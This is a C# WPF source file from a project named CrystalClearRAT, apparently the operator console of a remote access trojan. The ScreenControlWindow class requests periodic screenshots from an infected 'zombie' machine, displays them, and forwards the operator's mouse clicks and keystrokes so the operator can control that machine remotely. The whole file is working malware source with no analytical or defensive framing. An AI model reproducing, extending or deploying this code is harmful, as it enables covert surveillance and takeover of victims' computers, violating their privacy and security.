using CrystalClearRAT.Event;
using CrystalClearRAT.Functions;
using CrystalClearRAT.Web;
using CrystalClearRAT.ZombieModel;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace CrystalClearRAT.Windows
{
    /// <summary>
    /// Interaction logic for ScreenControlWindow.xaml
    /// </summary>
    public partial class ScreenControlWindow : Window
    {

        int minTimerInterval = 100;
        bool sendRunning;

        private Zombie zombie;
        DispatcherTimer screenshotTimer = new DispatcherTimer();

        public ScreenControlWindow(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
            FunctionManager.ImageReceived += OnImageReceived;
            this.zombie.Disconnected += OnZombieDisconnected;
            screenshotTimer.Tick += screenshotTimerTick;
            screenshotTimer.Interval = TimeSpan.FromMilliseconds(minTimerInterval);
        }

        private void OnZombieDisconnected(object sender, EventArgs e)
        {
            Dispatcher.Invoke(() => { this.Close(); });
        }

        private void OnImageReceived(object sender, EventArgs e)
        {
            byte[] imageData = (e as ImageArgs).Data;
            Dispatcher.Invoke(() => { screenImage.Source = LoadImage(imageData); });

        }


        private static BitmapImage LoadImage(byte[] imageData)
        {
            if (imageData == null || imageData.Length == 0) return null;
            var image = new BitmapImage();
            using (var mem = new MemoryStream(imageData))
            {
                mem.Position = 0;
                image.BeginInit();
                image.CreateOptions = BitmapCreateOptions.PreservePixelFormat;
                image.CacheOption = BitmapCacheOption.OnLoad;
                image.UriSource = null;
                image.StreamSource = mem;
                image.EndInit();
            }
            image.Freeze();
            return image;
        }





        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if (sendRunning)
            {
                screenshotTimer.Stop();
                sendRunning = false;
                controlButton.Content = "Start";
            }
            else
            {
                int newInterval;

                if (int.TryParse(intervalTextBox.Text, out newInterval))
                {
                    if (newInterval >= minTimerInterval)
                    {
                        sendRunning = true;
                        controlButton.Content = "Stop";
                        screenshotTimer.Interval = TimeSpan.FromMilliseconds(newInterval);
                        screenshotTimer.Start();
                    }

                    else
                    {
                        MessageBox.Show("The interval must be greeater or equal to " + minTimerInterval, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }

                else
                {
                    MessageBox.Show("The interval input is wrong.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private void screenshotTimerTick(object sender, EventArgs e)
        {
            Server.Send(Screenshot.Request(), zombie);
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            screenshotTimer.Stop();
            FunctionManager.ImageReceived -= OnImageReceived;
        }

        private void screenImage_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (screenshotTimer.IsEnabled)
            {
                System.Windows.Point mousePositon = e.GetPosition(screenImage);
                //  Console.WriteLine($"X: {mousePositon.X} Y: {mousePositon.Y}, xMax: {screenImage.ActualWidth}, yMax: {screenImage.ActualHeight}");
                Server.Send(ControlInput.ClickInfo((int)mousePositon.X, (int)screenImage.ActualWidth, (int)mousePositon.Y, (int)screenImage.ActualHeight), zombie);
            }
        }


        private void Window_KeyDown(object sender, KeyEventArgs e)
        {
            if(screenshotTimer.IsEnabled)
            Server.Send(ControlInput.KeyInfo(KeyInterop.VirtualKeyFromKey((e.Key))), zombie);
        }
    }
}
